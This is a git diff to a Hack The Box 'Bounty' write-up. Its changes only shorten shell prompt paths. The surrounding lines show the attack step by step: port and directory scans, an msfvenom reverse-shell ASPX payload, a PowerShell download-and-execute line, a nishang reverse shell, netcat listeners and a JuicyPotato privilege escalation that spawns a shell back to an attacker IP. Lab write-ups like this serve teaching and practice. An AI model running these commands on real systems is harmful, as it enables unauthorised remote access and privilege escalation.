@@ -26,7 +26,7 @@ tags:
 ## Open ports
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Bounty$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.93
+luc@kali:~/HTB/Bounty$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.93
 ```
 
 |Port|Service|Version
@@ -40,7 +40,7 @@ tcp/80|http|Microsoft IIS httpd 7.5
 The page only shows an image and there is no `robots.txt` we we'll run Gobuster and hope to find some pages.
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Bounty$ gobuster dir -u http://10.10.10.93:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -z -k -l -x "txt,html,php,asp,aspx,jsp"
+luc@kali:~/HTB/Bounty$ gobuster dir -u http://10.10.10.93:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -z -k -l -x "txt,html,php,asp,aspx,jsp"
 /aspnet_client (Status: 301) [Size: 159]
 /transfer.aspx (Status: 200) [Size: 941]
 /uploadedfiles (Status: 301) [Size: 159]
@@ -53,7 +53,7 @@ We can upload files on `/transfer.aspx` and those files will probably end up in 
 First we'll generate a shell to upload with MSFvenom.
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Bounty$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=443 -f aspx > shell.aspx
+luc@kali:~/HTB/Bounty$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=443 -f aspx > shell.aspx
 ```
 
 ![Shell upload](/assets/images/HTB-Bounty/1.a%20Shell%20upload.png)
@@ -89,15 +89,15 @@ CreateObject("WScript.Shell").Exec("cmd /c powershell IEX(New-Object Net.WebClie
 ```
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Bounty$ cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
-luc@kali:~/Documents/Cyber-security/HTB/Bounty$ echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443' >> Invoke-PowerShellTcp.ps1
-luc@kali:~/Documents/Cyber-security/HTB/Bounty$ python3 -m http.server
+luc@kali:~/HTB/Bounty$ cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+luc@kali:~/HTB/Bounty$ echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443' >> Invoke-PowerShellTcp.ps1
+luc@kali:~/HTB/Bounty$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.10.93 - - [12/Jun/2020 16:16:42] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
 ```
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Bounty$ sudo nc -lnvp 443
+luc@kali:~/HTB/Bounty$ sudo nc -lnvp 443
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::443
 Ncat: Listening on 0.0.0.0:443
@@ -138,9 +138,9 @@ System Type:               x64-based PC
 This machine is vulnerable to JuicyPotato.
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Bounty$ cp /opt/JuicyPotatoBinaries/JuicyPotato.exe .
-luc@kali:~/Documents/Cyber-security/HTB/Bounty$ cp /home/luc/Downloads/netcat-win32-1.12/nc64.exe .
-luc@kali:~/Documents/Cyber-security/HTB/Bounty$ sudo python2 /opt/impacket/examples/smbserver.py share `pwd` -smb2support
+luc@kali:~/HTB/Bounty$ cp /opt/JuicyPotatoBinaries/JuicyPotato.exe .
+luc@kali:~/HTB/Bounty$ cp /home/luc/Downloads/netcat-win32-1.12/nc64.exe .
+luc@kali:~/HTB/Bounty$ sudo python2 /opt/impacket/examples/smbserver.py share `pwd` -smb2support
 ```
 
 ```bash
@@ -150,7 +150,7 @@ PS Z:\> .\JuicyPotato.exe -t * -l 9000 -p nc64.exe -a "-e cmd 10.10.14.16 444"
 ```
 
 ```bash
-luc@kali:~/Documents/Cyber-security/HTB/Bounty$ sudo nc -lnvp 444
+luc@kali:~/HTB/Bounty$ sudo nc -lnvp 444
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::444
 Ncat: Listening on 0.0.0.0:444
